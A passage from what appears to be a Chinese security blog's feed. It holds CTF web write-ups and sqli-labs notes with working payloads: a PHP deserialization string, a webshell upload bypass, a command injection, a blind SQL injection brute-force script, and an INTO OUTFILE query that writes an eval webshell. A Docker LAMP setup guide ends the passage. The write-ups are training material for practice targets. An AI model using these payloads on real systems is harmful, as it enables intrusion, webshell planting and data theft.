class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结合class.php中的代码以及php的反序列化漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure><p>参考以前写过的一篇blog：<br><a href='/archives/488'>PHP反序列化漏洞</a></p><h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>http头相关知识，抓包可以发现隐藏的链接，链接到<code>Secret.php</code>，然后修改相应http头即可</p><h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>pthml绕过文件名检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($REQUEST[shell])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>绕过<code>&lt;?</code>检测</p><p>没想到的是还有<code>upload</code>路径问题。</p><h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;cat &#x2F;flag</span><br></pre></td></tr></table></figure><h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>数字型注入，而且没有过滤掉函数，手动fuzz一下可以用<code>if()</code>函数盲注，没有过滤<code>select</code>或者<code>from</code>等关键词，但是只要一用<code>select flag from flag</code>就会报<code>sql injection</code>，而且也过滤了<code>/**/</code>，不知道为啥，后来想到会不会只正则匹配，然后误打误撞发现换行竟然可以绕过检测，后来看了源码才知道原来是过滤了空格。我是用换行绕过了，另外还可以用括号绕过，同样不会出现空格，如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(flag)<span class="keyword">from</span>(flag)</span><br></pre></td></tr></table></figure><p>没有写二分法，<del>真男人</del>（懒狗）从来都是直接爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://48fee26c-e35d-461b-ad08-91ff24f3c0f4.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    word_i = <span class="built_in">str</span>(i)</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">128</span>):</span><br><span class="line">        word_num = <span class="built_in">str</span>(num)</span><br><span class="line">        payload = <span class="string">&#x27;if(ascii(right(left((\nselect\nflag\nfrom\nflag),%s),1))=%s,1,2)&#x27;</span> % (word_i, word_num)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            ans += <span class="built_in">chr</span>(num)</span><br><span class="line">            print(ans)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> ans:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h3><p>先是get下载<code>index.php.bak</code>，然后分析代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传递的参数必须为数字，网上有些说<code>is_numeric()</code>函数还能判断十六进制，但是我尝试了一下只能是十进制，不知道为啥，然后<code>$key</code>被转换为数字和<code>$str</code>比较相等即得flag，强制类型转换<code>?key=123</code>即可</p>]]></content>
    
    
    <summary type="html">记录一下在buuoj上刷的题目</summary>
    
    
    
    <category term="CTF" scheme="https://r4in1.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://r4in1.github.io/categories/CTF/WEB/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL-libs 1-?</title>
    <link href="https://r4in1.github.io/2020/12/02/SQL-libs-1-N/"/>
    <id>https://r4in1.github.io/2020/12/02/SQL-libs-1-N/</id>
    <published>2020-12-02T12:01:05.000Z</published>
    <updated>2020-12-02T12:23:35.410Z</updated>
    
    <content type="html"><![CDATA[<h2 id="搬运自原博客"><a href="#搬运自原博客" class="headerlink" title="搬运自原博客"></a>搬运自原博客</h2><p><a href="http://ueverglow.top/">http://ueverglow.top</a></p><p>前几天看到同学在群里发的sqli-libs教程，想着在家闲着也是无聊，不如搞点事情，于是按照教程下载了phpstudy和sqli-libs，学习一波</p><p>第一二三关没什么好说的，总结</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查库名：<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata</span><br><span class="line">查表名：<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;对应数据库名&#x27;</span></span><br><span class="line">查列名：<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;对应表名&#x27;</span></span><br><span class="line">查字段：<span class="keyword">select</span> <span class="string">&#x27;字段名&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;对应数据库名.对应表名&#x27;</span></span><br></pre></td></tr></table></figure><p>常用到的函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">group_concat()      //将多个结果整合成一个结果，默认用逗号分开</span><br><span class="line">concat_ws()         //将多个字段整合成一个字段，如果第一个参数设置了一个字符串，则多个字段间用第一个参数隔开，如果没有设置第一个参数，字段间将直接连接</span><br><span class="line">@@version_compile_os//查看操作系统信息</span><br><span class="line">@@datadir           //查看mysql安装路径</span><br><span class="line">@@version           //查看mysql版本</span><br><span class="line">version()           //同上</span><br><span class="line">database()          //查看当前使用的数据库</span><br><span class="line">system_user()       //查看当前用户</span><br><span class="line">user()              //同上</span><br><span class="line">current_user()      //同上</span><br></pre></td></tr></table></figure><p>ps：如果某个地方需要用到字符串，比如<code>concat_ws(&#39;~&#39;,username,password)</code>，字符串可用16进制表示，可改成<code>concat_ws(0x7e,username,password)</code>以避免使用单引号，也可以用<code>char()</code>函数，里面的参数是ASCII码（默认十进制，也可以加前缀0x使用16进制），返回字符串，比如<code>char(35,36,37)</code>返回<code>#$%</code>；查表名或者列名时，对应数据库名或者表名也必须指定为字符串，这时候也可以直接编码为16进制，以避免使用引号。</p><p>第四关的sql语句是用(“”)包裹起来的，这地方有个问题</p><p>查询语句为<code>select * from users where id=(&quot;1&#39;&quot;) limit 0,1；</code>能正常查询出id为1的数据，但是改成<code>(&quot;&#39;1&quot;)</code>或者<code>(&quot;&#39;1&#39;&quot;)</code>查询结果都是空，搞不明白为啥，很神奇。。。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1=&quot;1&#x27;&quot;;</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">| 1=&quot;1&#x27;&quot; |</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">|      1 |</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">1 row in <span class="keyword">set</span>, <span class="number">1</span> <span class="keyword">warning</span> (<span class="number">0.00</span> sec)</span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="number">1</span>=<span class="string">&quot;&#x27;1&quot;</span>;</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">| 1=&quot;&#x27;1&quot; |</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">|      0 |</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">1 row in <span class="keyword">set</span>, <span class="number">1</span> <span class="keyword">warning</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>第五六关，只有正确和错误两个回显，布尔盲注<br>总结：布尔盲注中常用到的函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ascii()       //参数为字符，返回字符的ascii值</span><br><span class="line">substr()      //参数：字符串，开始位置，截取字符个数</span><br><span class="line">mid()         //用法同substr()</span><br><span class="line">left()        //参数：字符串，返回字符串的长度</span><br><span class="line">right()       //参数：字符串，返回字符串的长度</span><br></pre></td></tr></table></figure><p>sqli-libs给的标题是Double query，双查询注入</p><p><a href='https://blog.csdn.net/Leep0rt/article/details/78556440' target='_blank' rel="noopener noreferrer">双查询注入</a>来源CSDN<br><a href='https://www.jianshu.com/p/e097a1c0d9ef' target='_blank' rel="noopener noreferrer">双查询注入</a>来源简书</p><p>简单的一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*), <span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">database</span>()), <span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a;//查询数据库</span><br><span class="line"><span class="comment">/*查询其他内容只需要把database()换一下就行了*/</span></span><br></pre></td></tr></table></figure><p>实际操作时发现，如果返回页面给报错信息的话，用双查询注入会比盲注要快，所以又去专门找了一下关于双查询注入原理的文章<br>总结原理，大概就是利用<code>rand()</code>函数和<code>group by</code>语句进行报错，适用于未屏蔽报错信息的情况。<br><a href='https://blog.csdn.net/qq_28295425/article/details/78785852' target='_blank' rel="noopener noreferrer">双查询注入</a>来源CSDN<br><a href='https://bbs.ichunqiu.com/thread-27209-1-1.html' target='_blank' rel="noopener noreferrer">双查询注入</a>来源i春秋</p><p>第七关</p><p>第七关要用到读写方面的知识</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">load_file(&#x27;路径&#x27;)                   //参数为路径，读取该路径的文件</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;内容&#x27;</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&#x27;路径&#x27;</span>    //将内容写到路径下的文件中</span><br><span class="line"><span class="comment">/*ps：outfile是不能覆盖写入的，如果文件已存在会报错*/</span></span><br><span class="line"></span><br><span class="line">// 把secure_file_priv直接设为/，直接给了MySQL根目录权限</span><br><span class="line">payload：</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;)) union select 1,2,&#x27;</span>&lt;?php @eval($_POST[<span class="string">&quot;pass&quot;</span>])?&gt;<span class="string">&#x27; into outfile &#x27;</span>G:\\phpStudy\\PHPTutorial\\WWW\\sqli\\<span class="keyword">Less</span><span class="number">-7</span>\\<span class="number">1.</span>php<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p>注意反斜线可能会被转义，所以要用两个反斜线<br>虽然回显You have an error in your SQL syntax，但是看了一下文件确实添加成功了，不知道为啥。<br>看了一下源码，那么应该就是因为这个<code>mysql_fetch_arrey()</code>的返回值转化为bool型之后是false了，但是为什么查询结果明明不是NULL，这个函数返回值却是false呢，迷</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line">    <span class="comment">//print_r(mysql_error());</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后用菜刀连接（感慨一句，菜刀太强了，真·功夫再高也怕菜刀），连接成功后什么都有了</p><p>而且我搞不太明白，为什么用分号分割执行sql语句不能成功。<br>然后找了一下w3school上关于<code>mysql_query()</code>的介绍，click <a href="https://www.w3school.com.cn/php/func_mysql_query.asp" target="_blank" rel="noopener noreferrer">here</a><br>猜测是因为这个函数可能只能进行一句sql语句的查询，w3school上也说了，这个函数执行的sql语句不要用分号结束</p><p>语法<br><code>mysql_query(query,connection)</code><br>参数 描述<br><code>query</code>     必需。规定要发送的 SQL 查询。注释：查询字符串不应以分号结束。<br><code>connection</code>     可选。规定 SQL 连接标识符。如果未规定，则使用上一个打开的连接。</p><p>另一种思路</p><p>其实这一题还可以将查询结果通过<code>outfile</code>直接输出到一个txt文件中，然后再去访问这个文件</p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>布尔盲注，跟我在第五六关中第一种方式一样，我们面对什么sql也不要怕。<br>经过实测，可以用脚本注，单引号<code>&#39;</code>闭合，<code>--+</code>注释。</p><p>mark一篇文章<a href='https://www.cnblogs.com/aqxss/p/6563625.html' targrt='_blank'>有关sql中的常用语法</a></p><p>第九关&amp;第十关<br>有点意思，这题题目是时间盲注，因为无论是否输入正确的id，都会回显“you are in”。<br>百度了一下时间盲注，基本原理大概就是利用sleep()函数，感觉和布尔盲注的区别就是，布尔盲注是页面回显有正确和错误，然而时间盲注只有一种回显，但是可以将bool值转化为是否延迟，如果true就执行sleep()函数，然后根据请求返回的时间来判断结果。<br>可能用到的函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep()            //延迟，参数为时间，单位为秒，函数正常执行会返回0，被中断返回1</span><br><span class="line">if(exp1,exp2,exp3) //如果exp1为true，则执行并返回exp2，否则执行并返回exp3</span><br></pre></td></tr></table></figure><p>可参考：<a href='https://www.jianshu.com/p/5aadd54e100c' target='_blank' rel="noopener noreferrer">SQL基于时间的盲注过程</a><br>第十一关<br>这题是一个登录页面，用post方法传递参数uname和passwd，本来以为直接用–注释掉后面的语句就可以登录，但是自己在MySQL中试了很多次，发现很多很迷的地方，总结如下<br>关于注释符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql的注释符</span><br><span class="line"><span class="comment">-- 注释(注意&#x27;--&#x27;后面要有空格)</span></span><br><span class="line"><span class="comment">#注释</span></span><br><span class="line">//注释</span><br><span class="line"><span class="comment">/*注释*/</span></span><br></pre></td></tr></table></figure><p>这一题经过测试如果只使用<code>--</code>注释而不闭合后面的单引号是会报错的，必须闭合所有的单引号而且使sql语句不能有语法错误；但是如果使用<code>#</code>作为注释符，就不用考虑闭合后面的单引号<br>然后就是正常的注入流程了，经过测试可以联合查询暴库<br>可参考<a href='https://blog.csdn.net/tianjin_ren/article/details/89945501' target='_blank' rel="noopener noreferrer">sqli-lab教程——1-35通关</a>(实际上并没有到35关…)</p><p>note:</p><p>PHP中@的作用：at符号（@）在PHP中用作错误控制操作符。当表达式附加@符号时，将忽略该表达式可能生成的错误消息。如果启用了<code>track_errors</code>功能，则表达式生成的错误消息将保存在变量<code>$php_errormsg</code>中。每个错误都会覆盖此变量。</p><p>第十二关<br>和第十一关基本一样，根据报错信息推测出闭合方式是”)，然后剩下还是联合查询暴库<br>第十三关<br>单引号报错之后可以推测闭合方式是’)，注释方式可使用#，然后返回页面只有正确和错误，应该是bool盲注了，不知道问什么，用Python脚本发送post请求会不成功，连用hackbar进行postdata都不能成功，只能手工注…<br>第十四关<br>闭合方式”，其他和第十三关相同<br>第十五关<br>未完待续…</p>]]></content>
    
    
    <summary type="html">关于sqllibs刷题的一些记录</summary>
    
    
    
    <category term="CTF" scheme="https://r4in1.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://r4in1.github.io/categories/CTF/WEB/"/>
    
    
    <category term="sqli" scheme="https://r4in1.github.io/tags/sqli/"/>
    
  </entry>
  
  <entry>
    <title>使用docker配置lamp环境</title>
    <link href="https://r4in1.github.io/2020/12/02/%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AElamp%E7%8E%AF%E5%A2%83/"/>
    <id>https://r4in1.github.io/2020/12/02/%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AElamp%E7%8E%AF%E5%A2%83/</id>
    <published>2020-12-02T09:11:31.000Z</published>
    <updated>2020-12-06T06:52:36.969Z</updated>
    
    <content type="html"><![CDATA[<p>前一段时间学了一下windows下docker的使用，y1s1，虽说学起来好像有点麻烦，但是确实香的一，今天上午的实验课几乎啥都没搞，就弄了一下docker，感觉好像没那么复杂，但是中途还是遇到了一些坑，或许是自己太菜了吧，写（水）篇blog记录一下</p><h2 id="容器创建"><a href="#容器创建" class="headerlink" title="容器创建"></a>容器创建</h2><p>其实镜像仓库一般都有配置好的lamp环境，但是貌似都是专门为某一个应用配置的环境，我打算单纯用ubuntu重新弄一个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name lamp -p 8009:80 -p 8037:3306 -v c/User/Francis/Docker/lamp/:/var/www/ ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>先把容器跑起来再说，方便以后对<code>www</code>目录的更改，可以<code>-v</code>创建目录映射，把<code>/var/www/</code>映射到宿主机上</p><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>这一步遇到许多坑，首先还是<code>apt</code>的问题，docker容器刚创建要先执行<code>apt update</code>然后才能使用<code>apt</code>安装其他应用，执行完执行后先安装<code>vim</code>或者<code>nano</code>等文本编辑器，方便修改一些配置文件之类的</p><h3 id="更换apt源"><a href="#更换apt源" class="headerlink" title="更换apt源"></a>更换apt源</h3><p>众所周知，由于某种不可抗力，直接使用官方的源，安装和更新会很慢，于是一般都会修改<code>/etc/apt/sources.list</code>文件改到国内的源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/apt/</span><br><span class="line">mv sources.list sources.list.bak</span><br><span class="line">nano sources.list</span><br></pre></td></tr></table></figure><p>然后把一些国内的源粘贴进去，比如阿里云的源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>然后就会发现自己安装php，apache等等，会变得很快很快很快。。。</p><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>但是！啪的一下，很快啊！就会遇到一个问题，安装mysql-server疯狂报错，mysql-client都没有问题，但是mysql-server就是不行，我人直接傻了，但是身为一名会百度的菜鸡，我是不会这么容易就放弃的，百度查了半天，再结合报错信息，会发现是perl依赖的问题，于是乎安装perl，然后会发现perl依赖于其他的软件包，那就安装依赖包，好家伙，其他依赖包又依赖于其他的依赖。。。最后貌似还形成了一个环？？？</p><p>到此进度就停住了，<del>lamp没有m应该也可以用？</del></p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><p>说实话我也不知道是什么原理，但是把阿里云的源换回原来的官方的源就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/apt/sources.list /etc/apt/sources.list.bak2</span><br><span class="line">mv /etc/apt/sources.list.bak /etc/apt/sources.list</span><br><span class="line">apt update</span><br><span class="line">apt install perl</span><br><span class="line">apt install mysql-server</span><br><span class="line"><span class="comment"># 安装过程极其丝滑（相比于像一个憨憨一样手动安装依赖，虽然速度慢了点，但是还是丝滑多了）</span></span><br></pre></td></tr></table></figure><p>？？？虽然问题解决了，但是，什么原理？</p><p><img src="https://i.loli.net/2020/12/02/7fP2hHsDNKmQpEx.png" alt="image-20201202174921483.png"></p><p><del>这里挖个坑吧，以后有空研究一下为什么，以及sources.list的工作原理</del></p><p>问题解决了，我是傻狗，对不起。</p><p><a href="https://blog.csdn.net/u012843189/article/details/80964287">https://blog.csdn.net/u012843189/article/details/80964287</a></p><h2 id="环境运行"><a href="#环境运行" class="headerlink" title="环境运行"></a>环境运行</h2><p>剩下的基本上就很简单了，启动对应的服务就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line">service mysql start</span><br></pre></td></tr></table></figure><p>以为到这里就结束了？不，还有坑，因为我安装的php，apache以及mysql全部都没有限制版本，于是乎全部都是最新版，emmm学习一下最新版的使用也是不错的，所以我就学到了最新版mysql更设置密码的方法</p><p>mysql5.7.9版本之后废弃了<code>password()</code>函数，所以说不能再用原来的方式更改密码了，旧的咒语不生效了，新的咒语是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># update mysql.user set authentication_string&#x3D;password(&#39;new_pass&#39;) where host&#x3D;&#39;localhost&#39; and user&#x3D;&#39;root&#39;;</span><br><span class="line"># 旧的咒语，不好！</span><br><span class="line">alter user &#39;root&#39;@&#39;localhost&#39; identified with mysql_native_password by &#39;new_pass&#39;;</span><br><span class="line"># 新的咒语，好！</span><br></pre></td></tr></table></figure><p>并且，直接apt安装php，是没有mysqli扩展的，也就是说还要手动安装，我真是太闲，为啥非要自己弄lamp。。。</p><p>访问index.html，ok，算是成功了吧。</p><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>泻药，docker很香，但是最后还是换回了vm，docker和vm不能共存就很烦，最后想了一下还是虚拟机比较好用，在虚拟机里用docker应该也可以。最后还是打算用虚拟机来配置lamp。</p><h2 id="用户组配置"><a href="#用户组配置" class="headerlink" title="用户组配置"></a>用户组配置</h2><p>使用service启动apache2，用户为<code>www-data</code>，可以配置<code>/var/www/html/</code>文件夹的拥有者以及个用户的权限来方便环境的使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chmod 775 /var/www/html <span class="comment"># 设置文件夹权限</span></span><br><span class="line">chown www-data /var/www/html <span class="comment"># 更改文件夹拥有者</span></span><br><span class="line">chgrp www-data /var/www/html <span class="comment"># 所属用户组</span></span><br><span class="line"></span><br><span class="line">usermod -a rain -G www-data 